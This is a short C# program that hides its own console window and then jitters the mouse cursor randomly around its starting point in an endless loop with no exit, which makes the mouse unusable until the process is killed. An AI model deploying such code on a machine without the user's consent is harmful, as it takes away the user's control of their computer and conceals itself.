using System;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    static void Main()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        
        Thread.Sleep(100); 

        var startPoint = Cursor.Position;
        Random rnd = new Random();
        
        while(true)
        {
            int offsetX = rnd.Next(-10, 11);
            int offsetY = rnd.Next(-10, 11);
            
            Cursor.Position = new System.Drawing.Point(startPoint.X + offsetX, startPoint.Y + offsetY);
            Thread.Sleep(10);
        }
    }
}
